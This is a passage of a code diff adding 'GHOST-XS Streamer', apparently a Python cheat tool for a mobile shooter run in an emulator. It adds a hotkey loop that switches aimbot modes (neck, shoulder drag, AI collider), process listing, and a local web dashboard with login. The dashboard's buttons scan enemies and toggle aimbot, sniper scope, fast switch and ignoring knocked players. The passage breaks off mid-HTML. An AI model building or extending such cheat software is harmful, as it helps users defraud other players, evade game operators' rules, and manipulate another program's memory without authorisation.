+        'Insert': 0x2D, 'Delete': 0x2E, 'Home': 0x24, 'End': 0x23,
+        'PageUp': 0x21, 'PageDown': 0x22,
+        'ArrowUp': 0x26, 'ArrowDown': 0x28, 'ArrowLeft': 0x25, 'ArrowRight': 0x27,
+        'MouseLeft': 0x01, 'MouseRight': 0x02, 'MouseMiddle': 0x04,
+        'MouseButton4': 0x05, 'MouseButton5': 0x06
+    }
+    
+    while True:
+        try:
+            current_time = time.time() * 1000
+            
+            if hotkey_state["hold_key"] and hotkey_state["hold_key"] in vk_map:
+                key_state = win32api.GetAsyncKeyState(vk_map[hotkey_state["hold_key"]])
+                key_held = (key_state & 0x8000) != 0
+                
+                if key_held and not hotkey_state["hold_active"]:
+                    hotkey_state["hold_active"] = True
+                    last_aim_time = current_time
+                    
+                elif key_held and hotkey_state["hold_active"]:
+                    if current_time - last_aim_time >= hotkey_state["delay"]:
+                        if hotkey_state["selected_aimbot"] == "AimbotAi":
+                            if collider_addresses:
+                                aimbot_active = False
+                                drag_mode_active = False
+                                collider_active = True
+                        elif hotkey_state["selected_aimbot"] == "LeftShoulder":
+                            pass
+                        elif hotkey_state["selected_aimbot"] == "RightShoulder":
+                            pass
+                        else:
+                            if aimbot_addresses:
+                                drag_mode_active = False
+                                collider_active = False
+                                current_aim_mode = "NECK"
+                                aimbot_active = True
+                            
+                elif not key_held and hotkey_state["hold_active"]:
+                    hotkey_state["hold_active"] = False
+                    if hotkey_state["selected_aimbot"] == "AimbotAi":
+                        collider_active = False
+                    elif hotkey_state["selected_aimbot"] in ["LeftShoulder", "RightShoulder"]:
+                        pass
+                    else:
+                        aimbot_active = False
+                        current_aim_mode = None
+        except:
+            pass
+        time.sleep(0.001)
+
+# ==================== GET PROCESS LIST ====================
+def get_running_processes():
+    processes = []
+    try:
+        import psutil
+        for proc in psutil.process_iter(['pid', 'name']):
+            try:
+                processes.append({'pid': proc.info['pid'], 'name': proc.info['name']})
+            except:
+                pass
+        processes.sort(key=lambda x: x['name'].lower())
+    except:
+        pass
+    return processes
+
+def is_process_running(process_name):
+    try:
+        import psutil
+        for proc in psutil.process_iter(['name']):
+            if proc.info['name'] and proc.info['name'].lower() == process_name.lower():
+                return True
+    except:
+        pass
+    return False
+
+# ==================== WEB SERVER ====================
+class GhostWebServer(BaseHTTPRequestHandler):
+    def do_GET(self):
+        path = urlparse(self.path).path
+        
+        if path == '/':
+            self.send_login_page()
+        elif path == '/dashboard':
+            self.send_dashboard_page()
+        elif path == '/get_hd_player_status':
+            self.send_process_status()
+        elif path == '/get_processes':
+            self.send_process_list()
+        elif path == '/get_hotkey_aimbot':
+            self.send_hotkey_aimbot()
+        elif path == '/get_hold_hotkey':
+            self.send_hold_hotkey()
+        elif path == '/get_scope_hotkey':
+            self.send_scope_hotkey()
+        elif path == '/get_drag_power':
+            self.send_drag_power()
+        else:
+            self.send_error(404)
+    
+    def do_POST(self):
+        path = urlparse(self.path).path
+        content_length = int(self.headers.get('Content-Length', 0))
+        post_data = self.rfile.read(content_length)
+        
+        try:
+            data = json.loads(post_data) if post_data else {}
+        except:
+            data = {}
+        
+        if path == '/login':
+            self.handle_login(data)
+        elif path == '/execute':
+            self.handle_execute(data)
+        elif path == '/save_hotkey':
+            self.save_hotkey(data)
+        elif path == '/save_hold_hotkey':
+            self.save_hold_hotkey(data)
+        elif path == '/save_hold_delay':
+            self.save_hold_delay(data)
+        elif path == '/save_scope_hotkey':
+            self.save_scope_hotkey(data)
+        elif path == '/set_drag_power':
+            self.set_drag_power(data)
+        elif path == '/update_hotkey_aimbot':
+            self.update_hotkey_aimbot(data)
+        elif path == '/update_selected_aimbot':
+            self.update_selected_aimbot(data)
+        elif path == '/set_target_process':
+            self.set_target_process(data)
+        elif path == '/set_ignore_knocked':
+            self.set_ignore_knocked(data)
+        elif path == '/logout':
+            self.handle_logout()
+        elif path == '/exit':
+            self.handle_exit()
+        else:
+            self.send_json({'success': False})
+    
+    def send_login_page(self):
+        self.send_response(200)
+        self.send_header('Content-type', 'text/html')
+        self.end_headers()
+        
+        html = """<!DOCTYPE html>
+<html>
+<head>
+    <title>GHOST-XS Login</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI',sans-serif; }
+        body { background:#0a0a0a; min-height:100vh; display:flex; justify-content:center; align-items:center; position:relative; overflow:hidden; }
+        canvas { position:fixed; top:0; left:0; width:100%; height:100%; z-index:1; }
+        .login-container { position:relative; z-index:2; width:90%; max-width:380px; }
+        .login-box { background:#141414; border:1px solid #ff3333; border-radius:8px; padding:30px 25px; box-shadow:0 0 20px rgba(255,51,51,0.2); }
+        h2 { color:#ff5555; text-align:center; font-size:28px; margin-bottom:5px; font-weight:400; }
+        .subtitle { color:#ff8888; text-align:center; margin-bottom:25px; font-size:13px; border-bottom:1px solid #ff3333; padding-bottom:15px; }
+        input { width:100%; padding:12px 15px; background:#1e1e1e; border:1px solid #333; border-radius:4px; color:#ffffff; font-size:14px; margin-bottom:20px; outline:none; transition:all 0.3s; }
+        input:focus { border-color:#ff5555; }
+        input::placeholder { color:#666666; }
+        button { width:100%; padding:12px; background:#1e1e1e; border:1px solid #ff3333; border-radius:4px; color:#ff5555; font-size:15px; cursor:pointer; transition:all 0.3s; }
+        button:hover { background:#2a2a2a; border-color:#ff5555; color:#ff7777; }
+        .error { color:#ef5350; text-align:center; margin-top:15px; display:none; }
+        
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.9);
+            z-index: 1000;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            backdrop-filter: blur(5px);
+        }
+        .loader-container {
+            text-align: center;
+        }
+        .circular-loader {
+            width: 200px;
+            height: 200px;
+            position: relative;
+        }
+        .circle-bg {
+            stroke: #333;
+            stroke-width: 8;
+            fill: none;
+        }
+        .circle-progress {
+            stroke: #ffffff;
+            stroke-width: 8;
+            fill: none;
+            stroke-dasharray: 565.48;
+            stroke-dashoffset: 565.48;
+            transition: stroke-dashoffset 0.05s linear;
+            stroke-linecap: round;
+        }
+        .percentage-text {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 48px;
+            font-weight: bold;
+            color: #ffffff;
+            font-family: monospace;
+        }
+        .status-text {
+            margin-top: 20px;
+            font-size: 18px;
+            font-weight: bold;
+        }
+        .circle-progress.success {
+            stroke: #00ff00;
+        }
+        .circle-progress.failed {
+            stroke: #ff0000;
+        }
+        .status-text.success {
+            color: #00ff00;
+        }
+        .status-text.failed {
+            color: #ff0000;
+        }
+    </style>
+</head>
+<body>
+    <canvas id="particleCanvas"></canvas>
+    <div class="login-container">
+        <div class="login-box">
+            <h2>GHOST-XS</h2>
+            <div class="subtitle">Streamer Edition</div>
+            <input type="text" id="username" placeholder="Username">
+            <input type="password" id="password" placeholder="Password">
+            <button onclick="login()">Login</button>
+            <div id="error" class="error"></div>
+        </div>
+    </div>
+    
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loader-container">
+            <div class="circular-loader">
+                <svg width="200" height="200" viewBox="0 0 200 200">
+                    <circle cx="100" cy="100" r="90" class="circle-bg" stroke="#333" stroke-width="8" fill="none"/>
+                    <circle cx="100" cy="100" r="90" class="circle-progress" stroke="#ffffff" stroke-width="8" fill="none" stroke-dasharray="565.48" stroke-dashoffset="565.48"/>
+                </svg>
+                <div class="percentage-text" id="percentageText">0%</div>
+            </div>
+            <div class="status-text" id="statusTextLoading"></div>
+        </div>
+    </div>
+    
+    <script>
+        const canvas = document.getElementById('particleCanvas');
+        const ctx = canvas.getContext('2d');
+        
+        let width = window.innerWidth;
+        let height = window.innerHeight;
+        canvas.width = width;
+        canvas.height = height;
+        
+        let particles = [];
+        
+        class Particle {
+            constructor() {
+                this.x = Math.random() * width;
+                this.y = Math.random() * height;
+                this.vx = (Math.random() - 0.5) * 0.3;
+                this.vy = (Math.random() - 0.5) * 0.3;
+                this.radius = Math.random() * 1.5 + 0.5;
+                this.color = `rgba(255, ${Math.random() * 100 + 50}, ${Math.random() * 50}, 0.4)`;
+            }
+            
+            update() {
+                this.x += this.vx;
+                this.y += this.vy;
+                
+                if (this.x < 0) this.x = width;
+                if (this.x > width) this.x = 0;
+                if (this.y < 0) this.y = height;
+                if (this.y > height) this.y = 0;
+            }
+            
+            draw() {
+                ctx.beginPath();
+                ctx.arc(this.x, this.y, this.radius, 0, Math.PI * 2);
+                ctx.fillStyle = this.color;
+                ctx.fill();
+            }
+        }
+        
+        function initParticles() {
+            particles = [];
+            for (let i = 0; i < 100; i++) {
+                particles.push(new Particle());
+            }
+        }
+        
+        function drawConnections() {
+            for (let i = 0; i < particles.length; i++) {
+                for (let j = i + 1; j < particles.length; j++) {
+                    const dx = particles[i].x - particles[j].x;
+                    const dy = particles[i].y - particles[j].y;
+                    const distance = Math.sqrt(dx * dx + dy * dy);
+                    
+                    if (distance < 100) {
+                        ctx.beginPath();
+                        ctx.moveTo(particles[i].x, particles[i].y);
+                        ctx.lineTo(particles[j].x, particles[j].y);
+                        const opacity = (1 - distance / 100) * 0.2;
+                        ctx.strokeStyle = `rgba(255, 80, 80, ${opacity})`;
+                        ctx.stroke();
+                    }
+                }
+            }
+        }
+        
+        function animate() {
+            ctx.clearRect(0, 0, width, height);
+            
+            for (let p of particles) {
+                p.update();
+                p.draw();
+            }
+            
+            drawConnections();
+            requestAnimationFrame(animate);
+        }
+        
+        window.addEventListener('resize', () => {
+            width = window.innerWidth;
+            height = window.innerHeight;
+            canvas.width = width;
+            canvas.height = height;
+            initParticles();
+        });
+        
+        initParticles();
+        animate();
+        
+        let loadingAnimation = null;
+        
+        function startLoadingAnimation() {
+            const overlay = document.getElementById('loadingOverlay');
+            const circle = document.querySelector('.circle-progress');
+            const percentageText = document.getElementById('percentageText');
+            const statusText = document.getElementById('statusTextLoading');
+            
+            overlay.style.display = 'flex';
+            circle.classList.remove('success', 'failed');
+            circle.setAttribute('stroke', '#ffffff');
+            statusText.classList.remove('success', 'failed');
+            statusText.textContent = '';
+            percentageText.style.color = '#ffffff';
+            
+            let progress = 0;
+            const duration = 3000;
+            const startTime = Date.now();
+            
+            if (loadingAnimation) clearInterval(loadingAnimation);
+            
+            loadingAnimation = setInterval(() => {
+                const elapsed = Date.now() - startTime;
+                progress = Math.min(100, (elapsed / duration) * 100);
+                const circumference = 565.48;
+                const offset = circumference - (progress / 100) * circumference;
+                circle.style.strokeDashoffset = offset;
+                percentageText.textContent = Math.floor(progress) + '%';
+                
+                if (progress >= 100) {
+                    clearInterval(loadingAnimation);
+                }
+            }, 16);
+            
+            return {
+                success: function() {
+                    if (loadingAnimation) clearInterval(loadingAnimation);
+                    const circle = document.querySelector('.circle-progress');
+                    const statusText = document.getElementById('statusTextLoading');
+                    const percentageText = document.getElementById('percentageText');
+                    
+                    circle.classList.add('success');
+                    statusText.classList.add('success');
+                    statusText.textContent = 'ACCESS GRANTED';
+                    percentageText.style.color = '#00ff00';
+                    
+                    setTimeout(() => {
+                        overlay.style.display = 'none';
+                    }, 1500);
+                },
+                fail: function() {
+                    if (loadingAnimation) clearInterval(loadingAnimation);
+                    const circle = document.querySelector('.circle-progress');
+                    const statusText = document.getElementById('statusTextLoading');
+                    const percentageText = document.getElementById('percentageText');
+                    
+                    circle.classList.add('failed');
+                    statusText.classList.add('failed');
+                    statusText.textContent = 'ACCESS FAILED';
+                    percentageText.style.color = '#ff0000';
+                    
+                    setTimeout(() => {
+                        overlay.style.display = 'none';
+                    }, 1500);
+                }
+            };
+        }
+        
+        function login() {
+            const u = document.getElementById('username').value;
+            const p = document.getElementById('password').value;
+            if (!u || !p) {
+                document.getElementById('error').style.display = 'block';
+                document.getElementById('error').textContent = 'Enter username and password';
+                return;
+            }
+            
+            document.getElementById('error').style.display = 'none';
+            const loader = startLoadingAnimation();
+            
+            fetch('/login', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ username: u, password: p })
+            })
+            .then(r => r.json())
+            .then(d => {
+                setTimeout(() => {
+                    if (d.success) {
+                        loader.success();
+                        setTimeout(() => {
+                            window.location.href = '/dashboard';
+                        }, 1600);
+                    } else {
+                        loader.fail();
+                        setTimeout(() => {
+                            document.getElementById('error').style.display = 'block';
+                            document.getElementById('error').textContent = 'Invalid credentials';
+                        }, 1600);
+                    }
+                }, 3000);
+            })
+            .catch(() => {
+                setTimeout(() => {
+                    loader.fail();
+                    setTimeout(() => {
+                        document.getElementById('error').style.display = 'block';
+                        document.getElementById('error').textContent = 'Connection error';
+                    }, 1600);
+                }, 3000);
+            });
+        }
+        
+        document.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') login();
+        });
+    </script>
+</body>
+</html>"""
+        self.wfile.write(html.encode())
+    
+    def send_dashboard_page(self):
+        self.send_response(200)
+        self.send_header('Content-type', 'text/html')
+        self.end_headers()
+        
+        html = """<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GHOST-XS Streamer</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #0a0a0a;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            color: #e0e0e0;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+        }
+
+        .card {
+            background: #141414;
+            border: 1px solid #2a2a2a;
+            border-radius: 12px;
+            margin-bottom: 16px;
+            overflow: hidden;
+            transition: all 0.3s ease;
+        }
+
+        .card-header {
+            padding: 16px 20px;
+            border-bottom: 1px solid #2a2a2a;
+            background: #0f0f0f;
+        }
+
+        .card-header h2 {
+            font-size: 16px;
+            font-weight: 600;
+            color: #ffffff;
+            letter-spacing: 0.3px;
+        }
+
+        .card-body {
+            padding: 20px;
+        }
+
+        .status-bar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .status-info {
+            flex: 1;
+        }
+
+        .status-label {
+            font-size: 13px;
+            color: #888;
+            margin-bottom: 4px;
+        }
+
+        .status-value {
+            font-size: 15px;
+            font-weight: 500;
+            color: #fff;
+        }
+
+        .current-process {
+            font-size: 12px;
+            color: #666;
+            margin-top: 4px;
+        }
+
+        .badge {
+            padding: 6px 14px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+            text-align: center;
+            min-width: 70px;
+        }
+
+        .badge.online {
+            background: #1e3a2e;
+            color: #4caf50;
+            border: 1px solid #2e7d32;
+        }
+
+        .badge.offline {
+            background: #3a1e1e;
+            color: #ef5350;
+            border: 1px solid #c62828;
+        }
+
+        .tabs {
+            display: flex;
+            gap: 4px;
+            background: #0f0f0f;
+            padding: 4px;
+            border-bottom: 1px solid #2a2a2a;
+        }
+
+        .tab {
+            flex: 1;
+            text-align: center;
+            padding: 12px 16px;
+            background: transparent;
+            border: none;
+            color: #888;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            border-radius: 8px;
+            transition: all 0.3s ease;
+        }
+
+        .tab:hover {
+            background: #1e1e1e;
+            color: #ccc;
+        }
+
+        .tab.active {
+            background: #1e1e1e;
+            color: #fff;
+        }
+
+        .content-panel {
+            display: none;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .content-panel.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+            gap: 12px;
+        }
+
+        .row:last-child {
+            margin-bottom: 0;
+        }
+
+        .row-label {
+            flex: 1;
+            min-width: 160px;
+        }
+
+        .row-label .title {
+            font-size: 14px;
+            font-weight: 500;
+            color: #e0e0e0;
+            margin-bottom: 4px;
+        }
+
+        .row-label .note {
+            font-size: 11px;
+            color: #666;
+        }
+
+        .row-controls {
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+            align-items: center;
+        }
+
+        .btn {
+            padding: 8px 16px;
+            background: #1e1e1e;
+            border: 1px solid #333;
+            border-radius: 6px;
+            color: #ccc;
+            font-size: 13px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            text-align: center;
+        }
+
+        .btn:hover {
+            background: #2a2a2a;
+            border-color: #444;
+        }
+
+        .btn.active {
+            background: #4caf50;
+            border-color: #4caf50;
+            color: #fff;
+        }
+
+        .btn-primary {
+            background: #2c2c2c;
+            border-color: #4a4a4a;
+            color: #fff;
+        }
+
+        .btn-primary:hover {
+            background: #3a3a3a;
+        }
+
+        .btn-danger {
+            background: #2a1a1a;
+            border-color: #8b3a3a;
+            color: #ff8a8a;
+        }
+
+        .btn-danger:hover {
+            background: #3a1e1e;
+            border-color: #aa4a4a;
+        }
+
+        select {
+            padding: 8px 12px;
+            background: #1e1e1e;
+            border: 1px solid #333;
+            border-radius: 6px;
+            color: #e0e0e0;
+            font-size: 13px;
+            cursor: pointer;
+            min-width: 160px;
+        }
+
+        select:hover {
+            border-color: #444;
+        }
+
+        .slider-container {
+            min-width: 200px;
+        }
+
+        .slider-label {
+            display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+            color: #888;
+            margin-bottom: 6px;
+        }
+
+        .slider-value {
+            color: #ccc;
+        }
+
+        input[type="range"] {
+            width: 100%;
+            height: 4px;
+            -webkit-appearance: none;
+            background: #2a2a2a;
+            border-radius: 2px;
+            outline: none;
+        }
+
+        input[type="range"]::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            width: 14px;
+            height: 14px;
+            border-radius: 50%;
+            background: #888;
+            cursor: pointer;
+            border: none;
+        }
+
+        input[type="range"]::-webkit-slider-thumb:hover {
+            background: #aaa;
+        }
+
+        .console {
+            background: #0a0a0a;
+            border: 1px solid #2a2a2a;
+            border-radius: 8px;
+            padding: 12px;
+            font-family: 'Consolas', monospace;
+            font-size: 12px;
+            color: #8bc34a;
+            height: 120px;
+            overflow-y: auto;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+
+        #notifications-container {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            z-index: 1000;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .notification {
+            background: #1e1e1e;
+            border-left: 3px solid #4caf50;
+            padding: 12px 18px;
+            border-radius: 8px;
+            color: #e0e0e0;
+            font-size: 13px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+            animation: slideIn 0.3s ease;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateX(100%);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+
+        .alt-process-section {
+            border-color: #3a2a2a;
+            background: #121212;
+        }
+
+        .alt-process-section .card-header {
+            background: #1a1212;
+            border-bottom-color: #3a2a2a;
+        }
+
+        .alt-process-section h2 {
+            color: #ff8a8a;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        hr {
+            border: none;
+            border-top: 1px solid #2a2a2a;
+            margin: 20px 0;
+        }
+
+        .section-title {
+            font-size: 14px;
+            font-weight: 600;
+            color: #aaa;
+            margin-bottom: 16px;
+            letter-spacing: 0.5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <div class="card-header">
+                <h2>GHOST-XS STREAMER</h2>
+            </div>
+            <div class="card-body">
+                <div class="status-bar">
+                    <div class="status-info">
+                        <div class="status-label">Status</div>
+                        <div class="status-value" id="statusText">Checking...</div>
+                        <div class="current-process" id="currentProcessText">Process: HD-Player.exe</div>
+                    </div>
+                    <div class="badge" id="statusBadge">Checking...</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="card alt-process-section hidden" id="alternative-process-section">
+            <div class="card-header">
+                <h2>Alternative Process Selector</h2>
+            </div>
+            <div class="card-body">
+                <div class="row">
+                    <div class="row-label">
+                        <div class="title">Select Process</div>
+                        <div class="note">Current target process is offline</div>
+                    </div>
+                    <div class="row-controls">
+                        <select id="process-selector">
+                            <option value="">Select a process...</option>
+                        </select>
+                        <div class="btn" id="refresh-processes" onclick="updateProcessList()">Refresh</div>
+                        <div class="btn btn-primary" onclick="setTargetProcess()">Set Process</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="card">
+            <div class="tabs">
+                <button class="tab active" data-tab="headshot">Headshot</button>
+                <button class="tab" data-tab="sniper">Sniper</button>
+                <button class="tab" data-tab="settings">Settings</button>
+            </div>
+
+            <div class="content-panel active" id="headshot">
+                <div class="card-body">
+                    <div class="row">
+                        <div class="row-label">
+                            <div class="title">Scan Enemies</div>
+                            <div class="note">Scans enemies in the match (CLEAN SCAN - NO AUTO ACTIVATION)</div>
+                        </div>
+                        <div class="row-controls">
+                            <div class="btn btn-primary" onclick="sendCommand('aimbotscan')">Scan Players</div>
+                        </div>
+                    </div>
+
+                    <div class="row">
+                        <div class="row-label">
+                            <div class="title">Aim Position</div>
+                            <div class="note">Hotkey - Help</div>
+                        </div>
+                        <div class="row-controls">
+                            <div class="btn" id="neckBtn" onclick="sendCommand('aimbotenable')">Neck</div>
+                            <div class="btn active" id="defaultBtn" onclick="sendCommand('aimbotdisable')">Default</div>
+                        </div>
+                    </div>
+
+                    <div class="row">
+                        <div class="row-label">
+                            <div class="title">Other Aim Position</div>
+                            <div class="note">Hotkey - Help</div>
+                        </div>
+                        <div class="row-controls">
+                            <select id="other-aimpos" onchange="updateSelectedAimbot()">
+                                <option value="RightShoulder">Right Shoulder</option>
+                                <option value="LeftShoulder">Left Shoulder</option>
+                                <option value="AimbotAi">Aimbot Ai</option>
+                            </select>
+                        </div>
+                    </div>
+
+                    <div class="row hidden" id="power-slider-container">
+                        <div class="row-label">
+                            <div class="title">Drag Power</div>
+                            <div class="note">0% = 0 pixels, 100% = 50 pixels drag needed</div>
+                        </div>
+                        <div class="slider-container">
+                            <div class="slider-label">
+                                <span>Power:</span>
+                                <span class="slider-value" id="powerValue">50%</span>
+                            </div>
+                            <input type="range" min="0" max="100" value="50" id="powerSlider">
+                        </div>
+                    </div>
+
+                    <div class="row leftShoulder hidden">
+                        <div class="row-label">
+                            <div class="title">Headshot Legit</div>
+                            <div class="note">Left Shoulder (Drag Mode)</div>
+                        </div>
+                        <div class="row-controls">
+                            <div class="btn" id="leftEnableBtn" onclick="sendCommand('leftShoulderOn')">Enable</div>
+                            <div class="btn active" id="leftDisableBtn" onclick="sendCommand('leftShoulderOff')">Disable</div>
+                        </div>
+                    </div>
+
+                    <div class="row rightShoulder">
+                        <div class="row-label">
+                            <div class="title">Headshot Legit</div>
+                            <div class="note">Right Shoulder (Drag Mode)</div>
+                        </div>
+                        <div class="row-controls">
+                            <div class="btn" id="rightEnableBtn" onclick="sendCommand('rightShoulderOn')">Enable</div>
+                            <div class="btn active" id="rightDisableBtn" onclick="sendCommand('rightShoulderOff')">Disable</div>
+                        </div>
+                    </div>
+
+                    <div class="row Aiaimbot hidden">
+                        <div class="row-label">
+                            <div class="title">Headshot Legit</div>
+                            <div class="note">Aimbot Ai (Collider)</div>
+                        </div>
+                        <div class="row-controls">
+                            <div class="btn" id="aiEnableBtn" onclick="sendCommand('AimbotAion')">Enable</div>
+                            <div class="btn active" id="aiDisableBtn" onclick="sendCommand('AimbotAioff')">Disable</div>
+                        </div>
+                    </div>
+
+                    <hr>
+
+                    <div class="section-title">Xghost Special Aimbot</div>
+
+                    <div class="row">
+                        <div class="row-label">
+                            <div class="title">Aimbot X (Hotkey Target)</div>
+                            <div class="note">Select which aimbot hotkeys will trigger</div>
+                        </div>
+                        <div class="row-controls">
+                            <select id="hotkey-aimbot-selector" onchange="updateHotkeyAimbot()">
+                                <option value="Head" selected>Head (Default)</option>
+                                <option value="RightShoulder">Right Shoulder</option>
+                                <option value="LeftShoulder">Left Shoulder</option>
+                                <option value="AimbotAi">Aimbot Ai</option>
+                            </select>
+                        </div>
+                    </div>
+
+                    <div class="row">
+                        <div class="row-label">
+                            <div class="title">Ignore Knocked Enemies</div>
+                            <div class="note">When enabled, aimbot ignores knocked players</div>
+                        </div>
+                        <div class="row-controls">
+                            <div class="btn active" id="ignoreYesBtn" onclick="setIgnoreKnocked(true)">Yes</div>
+                            <div class="btn" id="ignoreNoBtn" onclick="setIgnoreKnocked(false)">No</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="content-panel" id="sniper">
+                <div class="card-body">
+                    <div class="row">
+                        <div class="row-label">
+                            <div class="title">Sniper Load</div>
+                            <div class="note">Loads Sniper Scope & Switch</div>
+                        </div>
+                        <div class="row-controls">
+                            <div class="btn btn-primary" onclick="sendCommand('loadsniper')">Scan Sniper</div>
+                        </div>
+                    </div>
+
+                    <div class="row">
+                        <div class="row-label">
+                            <div class="title">Sniper Scope</div>
+                            <div class="note">Turn on Sniper Scope</div>
+                        </div>
+                        <div class="row-controls">
+                            <div class="btn" onclick="sendCommand('sniperscopeenable')">Enable</div>
+                            <div class="btn active" onclick="sendCommand('sniperscopedisable')">Disable</div>
+                        </div>
+                    </div>
+
+                    <div class="row">
+                        <div class="row-label">
+                            <div class="title">Sniper Switch</div>
+                            <div class="note">Turn on Sniper fast switch</div>
+                        </div>
+                        <div class="row-controls">
+                            <div class="btn" onclick="sendCommand('sniperswitchenable')">Enable</div>
+                            <div class="btn active" onclick="sendCommand('sniperswitchdisable')">Disable</div>
+                        </div>
+                    </div>
+
+                    <div class="row">
+                        <div class="row-label">
+                            <div class="title">Scope Toggle Hotkey</div>
+                            <div class="note">Hold key to toggle scope (like C++ version)</div>
+                        </div>
+                        <div class="row-controls">
+                            <select id="scope-hotkey-selector">
+                                <option value="">None</option>
+                                <optgroup label="Alphabet Keys">
+                                    <option value="A">A</option><option value="B">B</option><option value="C">C</option>
+                                    <option value="D">D</option><option value="E">E</option><option value="F">F</option>
+                                    <option value="G">G</option><option value="H">H</option><option value="I">I</option>
+                                    <option value="J">J</option><option value="K">K</option><option value="L">L</option>
+                                    <option value="M">M</option><option value="N">N</option><option value="O">O</option>
+                                    <option value="P">P</option><option value="Q">Q</option><option value="R">R</option>
+                                    <option value="S">S</option><option value="T">T</option><option value="U">U</option>
+                                    <option value="V">V</option><option value="W">W</option><option value="X">X</option>
+                                    <option value="Y">Y</option><option value="Z">Z</option>
+                                </optgroup>
+                                <optgroup label="Number Keys">
+                                    <option value="0">0</option><option value="1">1</option><option value="2">2</option>
+                                    <option value="3">3</option><option value="4">4</option><option value="5">5</option>
+                                    <option value="6">6</option><option value="7">7</option><option value="8">8</option>
+                                    <option value="9">9</option>
+                                </optgroup>
+                                <optgroup label="Function Keys">
+                                    <option value="F1">F1</option><option value="F2">F2</option><option value="F3">F3</option>
+                                    <option value="F4">F4</option><option value="F5">F5</option><option value="F6">F6</option>
+                                    <option value="F7">F7</option><option value="F8">F8</option><option value="F9">F9</option>
+                                    <option value="F10">F10</option><option value="F11">F11</option><option value="F12">F12</option>
+                                </optgroup>
+                                <optgroup label="Special Keys">
+                                    <option value="Space">Space</option><option value="Enter">Enter</option>
+                                    <option value="Shift">Shift</option><option value="Control">Control</option>
+                                    <option value="Alt">Alt</option><option value="Tab">Tab</option>
+                                    <option value="CapsLock">Caps Lock</option><option value="Escape">Escape</option>
+                                    <option value="Backspace">Backspace</option>
+                                </optgroup>
+                                <optgroup label="Mouse Buttons">
+                                    <option value="MouseLeft">Mouse Left</option><option value="MouseRight">Mouse Right</option>
+                                    <option value="MouseMiddle">Mouse Middle</option><option value="MouseButton4">Mouse Button 4</option>
+                                    <option value="MouseButton5">Mouse Button 5</option>
+                                </optgroup>
+                            </select>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="content-panel" id="settings">
+                <div class="card-body">
+                    <div class="row">
+                        <div class="row-label">
+                            <div class="title">Aimbot Legit Toggle</div>
+                            <div class="note">Toggle aimbot legit with a hotkey</div>
+                        </div>
+                        <div class="row-controls">
+                            <select id="hotkey-selector">
+                                <option value="">None</option>
+                                <optgroup label="Alphabet Keys">
+                                    <option value="A">A</option><option value="B">B</option><option value="C">C</option>
+                                    <option value="D">D</option><option value="E">E</option><option value="F">F</option>
+                                    <option value="G">G</option><option value="H">H</option><option value="I">I</option>
+                                    <option value="J">J</option><option value="K">K</option><option value="L">L</option>
+                                    <option value="M">M</option><option value="N">N</option><option value="O">O</option>
+                                    <option value="P">P</option><option value="Q">Q</option><option value="R">R</option>
+                                    <option value="S">S</option><option value="T">T</option><option value="U">U</option>
+                                    <option value="V">V</option><option value="W">W</option><option value="X">X</option>
+                                    <option value="Y">Y</option><option value="Z">Z</option>
+                                </optgroup>
+                                <optgroup label="Number Keys">
+                                    <option value="0">0</option><option value="1">1</option><option value="2">2</option>
+                                    <option value="3">3</option><option value="4">4</option><option value="5">5</option>
+                                    <option value="6">6</option><option value="7">7</option><option value="8">8</option>
+                                    <option value="9">9</option>
+                                </optgroup>
+                                <optgroup label="Function Keys">
+                                    <option value="F1">F1</option><option value="F2">F2</option><option value="F3">F3</option>
+                                    <option value="F4">F4</option><option value="F5">F5</option><option value="F6">F6</option>
+                                    <option value="F7">F7</option><option value="F8">F8</option><option value="F9">F9</option>
+                                    <option value="F10">F10</option><option value="F11">F11</option><option value="F12">F12</option>
+                                </optgroup>
+                                <optgroup label="Special Keys">
+                                    <option value="Space">Space</option><option value="Enter">Enter</option>
+                                    <option value="Shift">Shift</option><option value="Control">Control</option>
+                                    <option value="Alt">Alt</option><option value="Tab">Tab</option>
+                                    <option value="CapsLock">Caps Lock</option><option value="Escape">Escape</option>
